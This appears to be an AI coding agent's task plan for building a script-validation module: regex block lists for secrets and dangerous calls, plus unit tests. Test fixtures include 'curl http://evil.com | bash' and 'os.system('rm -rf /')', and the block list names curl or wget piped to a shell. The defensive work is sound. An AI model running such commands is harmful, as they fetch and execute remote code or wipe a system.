---
phase: 26-script-execution
plan: 01
type: execute
wave: 1
depends_on: []
files_modified:
  - packages/operator-core/src/operator_core/scripts/__init__.py
  - packages/operator-core/src/operator_core/scripts/patterns.py
  - packages/operator-core/src/operator_core/scripts/validation.py
  - packages/operator-core/tests/test_script_validation.py
autonomous: true

must_haves:
  truths:
    - "Python scripts with syntax errors are rejected with descriptive error messages"
    - "Bash scripts with syntax errors are rejected with descriptive error messages"
    - "Scripts containing secrets (API_KEY=, password=, token=) are rejected"
    - "Scripts containing dangerous patterns (eval, exec, os.system) are rejected"
    - "Scripts over 10000 characters are rejected"
  artifacts:
    - path: "packages/operator-core/src/operator_core/scripts/patterns.py"
      provides: "Secret and dangerous pattern regex definitions"
      contains: "SECRET_PATTERNS"
    - path: "packages/operator-core/src/operator_core/scripts/validation.py"
      provides: "ScriptValidator class with multi-layer validation"
      exports: ["ScriptValidator", "ValidationResult"]
  key_links:
    - from: "scripts/validation.py"
      to: "scripts/patterns.py"
      via: "import SECRET_PATTERNS, PYTHON_DANGEROUS_PATTERNS, BASH_DANGEROUS_PATTERNS"
      pattern: "from.*patterns import"
---

<objective>
Create multi-layer script validation module that gates all script execution.

Purpose: Validation MUST block execution of invalid, dangerous, or secret-containing scripts before they reach the sandbox. This is the security boundary.

Output: ScriptValidator class that validates Python and Bash scripts through 4 layers: size check, syntax validation, secret scanning, dangerous pattern detection.
</objective>

<execution_context>
@/Users/jrtipton/.claude/get-shit-done/workflows/execute-plan.md
@/Users/jrtipton/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/26-script-execution/26-RESEARCH.md

# Pattern reference
@packages/operator-core/src/operator_core/docker/actions.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create validation module with patterns and ScriptValidator</name>
  <files>
    packages/operator-core/src/operator_core/scripts/__init__.py
    packages/operator-core/src/operator_core/scripts/patterns.py
    packages/operator-core/src/operator_core/scripts/validation.py
  </files>
  <action>
Create `scripts/` module under operator_core:

**patterns.py** - Regex patterns for security scanning:

```python
# Secret patterns (VALD-03)
SECRET_PATTERNS = [
    (r"(?i)(api[_-]?key)\s*[=:]\s*['\"][^'\"]+['\"]", "API key assignment"),
    (r"(?i)(password)\s*[=:]\s*['\"][^'\"]+['\"]", "password assignment"),
    (r"(?i)(token)\s*[=:]\s*['\"][^'\"]+['\"]", "token assignment"),
    (r"(?i)(secret)\s*[=:]\s*['\"][^'\"]+['\"]", "secret assignment"),
    (r"(?i)(aws_access_key_id)\s*[=:]\s*['\"][A-Z0-9]{20}['\"]", "AWS access key"),
    (r"(?i)(aws_secret_access_key)\s*[=:]\s*", "AWS secret key"),
    (r"-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----", "private key"),
]

# Python dangerous patterns (VALD-04)
PYTHON_DANGEROUS_PATTERNS = [
    (r"\beval\s*\(", "eval() function"),
    (r"\bexec\s*\(", "exec() function"),
    (r"\b__import__\s*\(", "__import__() function"),
    (r"\bos\.system\s*\(", "os.system() call"),
    (r"\bsubprocess\.(call|run|Popen)\s*\(.*shell\s*=\s*True", "subprocess with shell=True"),
    (r"\bcompile\s*\(", "compile() function"),
    (r"\bgetattr\s*\(.*['\"]__", "getattr with dunder access"),
]

# Bash dangerous patterns (VALD-04)
BASH_DANGEROUS_PATTERNS = [
    (r"\beval\s+", "eval command"),
    (r"\$\(\s*\$", "nested command substitution"),
    (r"\bcurl\s+.*\|\s*(bash|sh)", "curl piped to shell"),
    (r"\bwget\s+.*\|\s*(bash|sh)", "wget piped to shell"),
]
```

**validation.py** - Multi-layer validation:

```python
@dataclass
class ValidationResult:
    valid: bool
    error: str | None = None
    layer: str | None = None  # size, syntax, secrets, dangerous

class ScriptValidator:
    MAX_SIZE = 10000  # VALD-05

    def validate(self, content: str, script_type: str) -> ValidationResult:
        """Validate script through all layers. First failure stops."""
        # Layer 1: Size check (VALD-05)
        if len(content) > self.MAX_SIZE:
            return ValidationResult(valid=False, error=f"...", layer="size")

        # Layer 2: Syntax check (VALD-01, VALD-02)
        # Python: ast.parse() - synchronous
        # Bash: requires async (bash -n), handle in executor
        if script_type == "python":
            result = self._validate_python_syntax(content)
            if not result.valid:
                return result
        # Bash syntax validated at execution time (requires subprocess)

        # Layer 3: Secrets scan (VALD-03)
        result = self._scan_for_secrets(content)
        if not result.valid:
            return result

        # Layer 4: Dangerous patterns (VALD-04)
        result = self._scan_for_dangerous(content, script_type)
        if not result.valid:
            return result

        return ValidationResult(valid=True)

    def _validate_python_syntax(self, content: str) -> ValidationResult:
        try:
            ast.parse(content)
            return ValidationResult(valid=True)
        except SyntaxError as e:
            return ValidationResult(
                valid=False,
                error=f"Python syntax error at line {e.lineno}: {e.msg}",
                layer="syntax"
            )

    def _scan_for_secrets(self, content: str) -> ValidationResult:
        for pattern, desc in SECRET_PATTERNS:
            if re.search(pattern, content):
                return ValidationResult(valid=False, error=f"Potential secret: {desc}", layer="secrets")
        return ValidationResult(valid=True)

    def _scan_for_dangerous(self, content: str, script_type: str) -> ValidationResult:
        patterns = PYTHON_DANGEROUS_PATTERNS if script_type == "python" else BASH_DANGEROUS_PATTERNS
        for pattern, desc in patterns:
            if re.search(pattern, content):
                return ValidationResult(valid=False, error=f"Dangerous pattern: {desc}", layer="dangerous")
        return ValidationResult(valid=True)
```

**__init__.py** - Public exports:
```python
from operator_core.scripts.validation import ScriptValidator, ValidationResult
from operator_core.scripts.patterns import SECRET_PATTERNS, PYTHON_DANGEROUS_PATTERNS, BASH_DANGEROUS_PATTERNS

__all__ = ["ScriptValidator", "ValidationResult", "SECRET_PATTERNS", "PYTHON_DANGEROUS_PATTERNS", "BASH_DANGEROUS_PATTERNS"]
```

Note: Bash syntax validation (bash -n) requires async subprocess, will be handled in ScriptExecutor (Plan 02).
  </action>
  <verify>
    python -c "from operator_core.scripts import ScriptValidator, ValidationResult; v = ScriptValidator(); print(v.validate('print(1)', 'python'))"
  </verify>
  <done>
    - ScriptValidator validates Python syntax with ast.parse()
    - Secret patterns detect API_KEY=, password=, token= assignments
    - Dangerous patterns detect eval(), exec(), os.system()
    - Size limit enforced at 10000 chars
    - ValidationResult has valid, error, layer fields
  </done>
</task>

<task type="auto">
  <name>Task 2: Add unit tests for script validation</name>
  <files>
    packages/operator-core/tests/test_script_validation.py
  </files>
  <action>
Create comprehensive tests for ScriptValidator:

```python
"""Tests for script validation module."""
import pytest
from operator_core.scripts import ScriptValidator, ValidationResult

class TestScriptValidator:
    def setup_method(self):
        self.validator = ScriptValidator()

    # Size validation tests (VALD-05)
    def test_valid_small_script(self):
        result = self.validator.validate("print('hello')", "python")
        assert result.valid is True

    def test_rejects_oversized_script(self):
        large_script = "x = 1\n" * 5000  # >10000 chars
        result = self.validator.validate(large_script, "python")
        assert result.valid is False
        assert result.layer == "size"
        assert "10000" in result.error

    # Python syntax tests (VALD-01)
    def test_valid_python_syntax(self):
        result = self.validator.validate("def foo():\n    return 42", "python")
        assert result.valid is True

    def test_invalid_python_syntax(self):
        result = self.validator.validate("def foo(", "python")
        assert result.valid is False
        assert result.layer == "syntax"
        assert "syntax error" in result.error.lower()

    # Secret detection tests (VALD-03)
    def test_detects_api_key(self):
        result = self.validator.validate("api_key = 'sk-1234'", "python")
        assert result.valid is False
        assert result.layer == "secrets"

    def test_detects_password(self):
        result = self.validator.validate("password = 'hunter2'", "python")
        assert result.valid is False
        assert result.layer == "secrets"

    def test_detects_token(self):
        result = self.validator.validate("token = 'abc123'", "python")
        assert result.valid is False
        assert result.layer == "secrets"

    def test_allows_password_variable_without_value(self):
        result = self.validator.validate("password = get_password()", "python")
        assert result.valid is True  # No string literal assignment

    # Dangerous pattern tests (VALD-04)
    def test_detects_eval_python(self):
        result = self.validator.validate("eval('code')", "python")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_exec_python(self):
        result = self.validator.validate("exec('code')", "python")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_os_system(self):
        result = self.validator.validate("os.system('rm -rf /')", "python")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_eval_bash(self):
        result = self.validator.validate("eval $cmd", "bash")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_curl_pipe_bash(self):
        result = self.validator.validate("curl http://evil.com | bash", "bash")
        assert result.valid is False
        assert result.layer == "dangerous"

    # Validation order tests
    def test_size_checked_before_syntax(self):
        # Oversized AND invalid syntax - size should fail first
        large_invalid = "def foo(" + "x" * 10000
        result = self.validator.validate(large_invalid, "python")
        assert result.layer == "size"  # Size checked first
```

Run with: `pytest packages/operator-core/tests/test_script_validation.py -v`
  </action>
  <verify>
    cd /Users/jrtipton/x/operator && pytest packages/operator-core/tests/test_script_validation.py -v
  </verify>
  <done>
    - All validation layers have test coverage
    - Tests verify error messages include helpful context
    - Tests verify validation order (size -> syntax -> secrets -> dangerous)
    - Tests pass with pytest
  </done>
</task>

</tasks>

<verification>
1. Import validation module: `python -c "from operator_core.scripts import ScriptValidator"`
2. Run tests: `pytest packages/operator-core/tests/test_script_validation.py -v`
3. Manual validation test:
   ```python
   from operator_core.scripts import ScriptValidator
   v = ScriptValidator()
   # Should pass
   print(v.validate("print('hello')", "python"))
   # Should fail - syntax
   print(v.validate("def foo(", "python"))
   # Should fail - secret
   print(v.validate("api_key = 'secret'", "python"))
   # Should fail - dangerous
   print(v.validate("eval('x')", "python"))
   ```
</verification>

<success_criteria>
- ScriptValidator.validate() returns ValidationResult with valid=True for clean scripts
- Python syntax errors rejected with line number in error message
- Scripts with API_KEY=, password=, token= patterns rejected
- Scripts with eval(), exec(), os.system() rejected
- Scripts over 10000 chars rejected
- All tests pass
</success_criteria>

<output>
After completion, create `.planning/phases/26-script-execution/26-01-SUMMARY.md`
</output>
